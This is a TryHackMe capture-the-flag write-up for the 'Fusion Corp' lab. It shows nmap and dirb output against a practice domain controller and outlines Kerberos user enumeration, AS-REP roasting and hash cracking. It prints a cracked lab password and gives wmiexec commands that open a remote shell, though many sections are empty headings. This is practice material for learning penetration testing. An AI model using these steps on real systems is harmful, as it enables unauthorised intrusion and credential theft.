<p align="center">May 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{360}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/28b561fc-e1c5-4660-a1d1-35253055f98b"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Fusion Corp}}$$</h1>
<p align="center"><em>Fusion Corp said they got everything patched... did they?</em>!<br>
It is classified as a hard-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/fusioncorp">here</a>.</p>

<p align="center"> <img width="1000px" src=""> </p>


<br>
<br>

<h2>Task 1 . Fuscion Corp</h2>


<p>You had an engagement a while ago for Fusion Corp. They contacted you saying they've patched everything reported and you can start retesting.</p>

<br>
<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>




<h2 align="center"> $$\textcolor{#f00c17}{\textnormal{Enumeration}}$$ </h2>

<h2 align="center">nmap</h2>
<p>- Concluded that Directory Domain Controller might be active because ports <code>53/TCP</code>, <code>88 / Microsoft Windows Kerberos</code> and <code>389 / Microsoft Windows Active Directory LDAP</code> are open.<br>
- Identified domain name <code>fusion.corp</code>. There is also LDAP in port  <code>3268</code>.</p>

```bash
:~/FusionCorp# nmap -sC -sV -n -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-01 17:55:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-01...
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2025-04-30T17:52:06
|_Not valid after:  2025-10-30T17:52:06
|_ssl-date: 2025-05-01T17:58:37+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: FUSION-DC, NetBIOS user: <unknown>, NetBIOS MAC: 0...(unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-01...
|_  start_date: N/A

...
:~/FusionCorp# 
```

<br>

<h2 align="center">dirb</h2>

```bash
:~/FusionCorp# dirb http://TargetIP /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

...
URL_BASE: http://TargetIP/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP/ ----
==> DIRECTORY: http://TargetIP/backup/                                                               
==> DIRECTORY: http://TargetIP/css/                                                                  
==> DIRECTORY: http://TargetIP/img/                                                                  
+ http://TargetIP/index.html (CODE:200|SIZE:53888)                                                   
==> DIRECTORY: http://TargetIP/js/                                                                   
==> DIRECTORY: http://TargetIP/lib/                                                                  
...
:~/FusionCorp# 
```

<h2 align="center">http://TargetIP</h2>

<br>

<br>

<h2 align="center">http://TargetIP/backup</h2>

<br>

<br>

<h2 align="center">http://TargetIP/backup/employees.ods</h2>

<br>

<p>Used <code>wget</code> <code>http://TargetIP/backup/employees.ods</code>.<br><br>
Double-clicked <code>employees.ods</code> and opened it in <code>LibbreOffice</code>.<br><br>
Created a file with the <code>usernames</code> --> <code>usernames.txt</code></p>

<br>

<br>

<br>

<br>

<br>

<h2 align="center">smbclient</h2>
<p>- Checked if <code>anonymous</code> is enabled.</p>

<br>

<br>

<p>- Checked the <code>shares</code>.</p>

<br>



<h2 align="center">kerbrute</h2>
<p>Used <code>kerbrute</code> which user(s) are/is valid.</p>

<br>

<br>

<h2 align="center">Impacket GetNPUsers</h2>

<br>

<br>


<h2 align="center">hashcat</h2>
<p>Cracked the hash using <code>hashcat</code>.<br><br>
Identified <code>lparker</code>:<code>!!abbylvzsvs2k6!</code><br><br>
Confirmed <code>Kerberos</code>´ <code>lparker@FUSION.CORP</code>;</p>

<br>


<br>


<br>

<h2 align="center">wmiexec</h2>
<p>- <code>wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py</code><br>
- <code>chmod +x wmiexec.py</code><br>
- <code>wmiexec.py -k -no-pass lparker@FUSION.CORP</code><br>
- Got the shell</p>

<br>

<br>


<h2 align="center">Domain users details</h2>

<br>

<br>


<h2 align="center">user <code>Joseph Murphy</code></h2>

<br>

<br>



<h2 align="center">http://TargetIP</h2>

> 1.1. <em>User1</em><br><a id='1.1'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

<br>

> 1.2. <em>User 2</em><br><a id='1.2'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

<br>

> 1.3. <em>User 3</em><br><a id='1.3'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

